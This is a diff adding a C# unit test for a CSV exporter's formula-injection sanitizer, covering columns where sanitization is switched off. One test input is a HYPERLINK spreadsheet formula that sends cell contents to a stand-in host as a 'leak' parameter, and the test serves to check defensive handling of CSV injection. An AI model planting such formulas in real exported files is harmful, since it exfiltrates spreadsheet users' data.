@@ -632,6 +632,36 @@ namespace DelimitedDataParser
         }
 
         [Theory]
+        [InlineData("=", @"""=""")]
+        [InlineData("+", @"""+""")]
+        [InlineData("-", @"""-""")]
+        [InlineData("@", @"""@""")]
+        [InlineData(@"=HYPERLINK(""http://example.com?leak=""&A1&A2, ""Click here"")", @"""=HYPERLINK(""""http://example.com?leak=""""&A1&A2, """"Click here"""")""")]
+        public void Sanitizer_Does_Not_Escape_Blacklisted_Characters_WithEscapeCharacters_WhenPrevented(string inputString, string expectedOutput)
+        {
+            var input = CreateDataTable();
+            AddColumn(input, "One");
+            AddColumn(input, "Two");
+
+            AddRow(input, inputString, inputString);
+
+            var exporter = new Exporter
+            {
+                IncludeEscapeCharacters = true,
+                SanitizeStrings = true
+            };
+
+            exporter.SetColumnsAsSanitizationPrevented(new[] { "One", "Two" });
+
+            var output = exporter.ExportToString(input);
+
+            Assert.Equal(
+                @"""One"",""Two""" + Environment.NewLine
+                + string.Concat(expectedOutput + ",", expectedOutput),
+                output);
+        }
+
+        [Theory]
         [InlineData("abcdef")]
         [InlineData("abc + def - ghi @ jkl")]
         [InlineData(" =")]
